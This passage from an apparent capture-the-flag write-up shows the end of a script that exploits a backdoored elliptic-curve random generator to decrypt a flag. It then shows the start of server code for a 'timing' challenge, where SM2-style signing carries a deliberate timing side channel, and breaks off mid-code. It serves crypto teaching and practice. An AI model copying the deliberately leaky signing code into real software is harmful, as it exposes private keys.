<span class="number">66604141534275704476445937214374130642068729921454877238730830814793201802544</span></span><br><span class="line">Q = (<span class="number">48439561293906451759052585252797914202762949526041747995844080717082404635286</span>, <span class="number">36134250956749795798585127919587881956611106672985015071877198253568414405109</span>)</span><br><span class="line">c = <span class="number">59100197418944667413449341413044666843726352095054393072750502893110293231642</span></span><br><span class="line">ct = <span class="number">25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span></span><br><span class="line"></span><br><span class="line">P = E(P)</span><br><span class="line">Q = E(Q)</span><br><span class="line">R0 = E.lift_x(c)</span><br><span class="line">s1 = (d*R0)[<span class="number">0</span>]</span><br><span class="line">s2 = ((s1*P)[<span class="number">0</span>]*P)[<span class="number">0</span>]</span><br><span class="line">r1 = ((s1*P)[<span class="number">0</span>]*Q)[<span class="number">0</span>]</span><br><span class="line">key = r1 &gt;&gt; ((<span class="number">32</span> - <span class="number">16</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">key = long_to_bytes(key)</span><br><span class="line">ct = long_to_bytes(ct)</span><br><span class="line"><span class="built_in">print</span>(cipher.decrypt(ct))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NepCTF&#123;NS4_b4ckd00r_1n_ps3ud0_r4nd0m_g3n3r4t0r&#125;\x01&#x27; </span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="timing"><a href="#timing" class="headerlink" title="timing"></a>timing</h3><blockquote><p>牢不可破的算法，或许会在其他地方出现问题？<br>(容器下发后，师傅自行nc哦～～～)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> perf_counter_ns <span class="keyword">as</span> clock1</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ecc_table = &#123;</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span></span><br><span class="line">         <span class="string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">         <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TSM2</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, sk</span>):</span><br><span class="line">        self.ecc_table = ecc_table</span><br><span class="line">        self.n = <span class="built_in">int</span>(ecc_table[<span class="string">&#x27;n&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">        self.para_len = <span class="built_in">len</span>(ecc_table[<span class="string">&#x27;n&#x27;</span>])</span><br><span class="line">        self.ecc_a3 = (<span class="built_in">int</span>(ecc_table[<span class="string">&#x27;a&#x27;</span>], base=<span class="number">16</span>) +</span><br><span class="line">                       <span class="number">3</span>) % <span class="built_in">int</span>(ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        self.sk = sk</span><br><span class="line">        self.pk = self.kg(self.sk, ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, data, K</span>):</span><br><span class="line">        e = data</span><br><span class="line">        d = self.sk</span><br><span class="line">        k = K</span><br><span class="line"></span><br><span class="line">        P1 = self.kg(k, self.ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">        x = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        R = ((e + x) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        <span class="keyword">if</span> R == <span class="number">0</span> <span class="keyword">or</span> R + k == <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        d_1 = <span class="built_in">pow</span>(</span><br><span class="line">            d+<span class="number">1</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>) - <span class="number">2</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        S = (d_1*(k + R) - R) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> S == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%064x%064x&#x27;</span> % (R, S)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, Sign, data</span>):</span><br><span class="line">        r = <span class="built_in">int</span>(Sign[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(Sign[self.para_len:<span class="number">2</span> * self.para_len], <span class="number">16</span>)</span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        t = (r + s) % self.n</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        P1 = self.kg(s, self.ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">        P2 = self.kg(t, self.pk)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> P1 == P2:</span><br><span class="line">            P1 = <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = self._double_point(P1)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            P1 = <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = self._add_point(P1, P2)</span><br><span class="line">            P1 = self._convert_jacb_to_nor(P1)</span><br><span class="line"></span><br><span class="line">        x = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> r == ((e + x) % self.n)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kg</span>(<span class="params">self, k, Point</span>):</span><br><span class="line">        k=k%self.n</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span></span><br><span class="line">        Point = <span class="string">&#x27;%s%s&#x27;</span> % (Point, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        mask_str = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.para_len - <span class="number">1</span>):</span><br><span class="line">            mask_str += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        mask = <span class="built_in">int</span>(mask_str, <span class="number">16</span>)</span><br><span class="line">        Temp = Point</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(self.para_len * <span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                Temp = self._double_point(Temp)</span><br><span class="line">            <span class="keyword">if</span> (k &amp; mask) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    Temp = self._add_point(Temp, Point)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flag = <span class="literal">True</span></span><br><span class="line">                    Temp = Point</span><br><span class="line">            k = k &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self._convert_jacb_to_nor(Temp)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_double_point</span>(<span class="params">self, Point</span>):</span><br><span class="line">        t1=clock1()</span><br><span class="line">        l = <span class="built_in">len</span>(Point)</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        <span class="keyword">if</span> l &lt; self.para_len * <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x1 = <span class="built_in">int</span>(Point[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            y1 = <span class="built_in">int</span>(Point[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l == len_2:</span><br><span class="line">                z1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                z1 = <span class="built_in">int</span>(Point[len_2:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T6 = (z1 * z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y1 * y1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x1 + T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (x1 - T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T3 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (y1 * z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * <span class="number">8</span>) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (x1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * <span class="number">3</span>) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (T6 * T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (self.ecc_a3 * T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 + T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            z3 = (T3 + T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T1 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            x3 = (T3 - T5) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (T5 % <span class="number">2</span>) == <span class="number">1</span>:</span><br><span class="line">                T4 = (T5 + ((T5 + <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)) &gt;&gt; <span class="number">1</span>) - T3) % <span class="built_in">int</span>(</span><br><span class="line">                    self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                T4 = (T5 + (T5 &gt;&gt; <span class="number">1</span>) - T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (T1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            y3 = (T1 - T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            t2=clock1()</span><br><span class="line">            <span class="keyword">if</span>(t2-t1&lt;<span class="number">1e7</span>):</span><br><span class="line">                sleep(<span class="number">0.01</span>-(((t2-t1))/<span class="number">1000000000.0</span>))</span><br><span class="line">            <span class="keyword">return</span> form % (x3, y3, z3)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_add_point</span>(<span class="params">self, P1, P2</span>):</span><br><span class="line">        t1=clock1()</span><br><span class="line">        <span class="keyword">if</span> P1 == <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s%s&#x27;</span> % (P2, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> P2 == <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        l1 = <span class="built_in">len</span>(P1)</span><br><span class="line">        l2 = <span class="built_in">len</span>(P2)</span><br><span class="line">        <span class="keyword">if</span> (l1 &lt; len_2) <span class="keyword">or</span> (l2 &lt; len_2):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            X1 = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            Y1 = <span class="built_in">int</span>(P1[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l1 == len_2:</span><br><span class="line">                Z1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Z1 = <span class="built_in">int</span>(P1[len_2:], <span class="number">16</span>)</span><br><span class="line">            x2 = <span class="built_in">int</span>(P2[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            y2 = <span class="built_in">int</span>(P2[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (Z1 * Z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y2 * Z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x2 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T3 - X1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 + X1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 - Y1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            Z3 = (Z1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (T1 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (X1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            X3 = (T5 - T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (Y1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T4 - X3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            Y3 = (T1 - T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            t2=clock1()</span><br><span class="line">            <span class="keyword">if</span>(t2-t1&lt;<span class="number">1e8</span>):</span><br><span class="line">                sleep(<span class="number">0.1</span>-(((t2-t1))/<span class="number">1000000000.0</span>))</span><br><span class="line">            <span class="keyword">return</span> form % (X3, Y3, Z3)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_convert_jacb_to_nor</span>(<span class="params">self, Point</span>):</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        x = <span class="built_in">int</span>(Point[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        y = <span class="built_in">int</span>(Point[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">        z = <span class="built_in">int</span>(Point[len_2:], <span class="number">16</span>)</span><br><span class="line">        z_inv = <span class="built_in">pow</span>(</span><br><span class="line">            z, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>) - <span class="number">2</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        z_invSquar = (z_inv * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_invQube = (z_invSquar * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        x_new = (x * z_invSquar) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        y_new = (y * z_invQube) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_new = (z * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> z_new == <span class="number">1</span>:</span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">2</span></span><br><span class="line">            <span class="keyword">return</span> form % (x_new, y_new)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_point</span>(<span class="params">self,P1,P2</span>):</span><br><span class="line">        <span class="keyword">if</span> P1==P2:</span><br><span class="line">            <span class="keyword">return</span> self._double_point(P1)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="keyword">return</span> self._convert_jacb_to_nor(self._add_point(P1,P2))</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recvall</span>(<span class="params">self</span>):</span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span><br><span class="line">        msg=msg.encode()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span><br><span class="line">        self.send(prompt, newline=<span 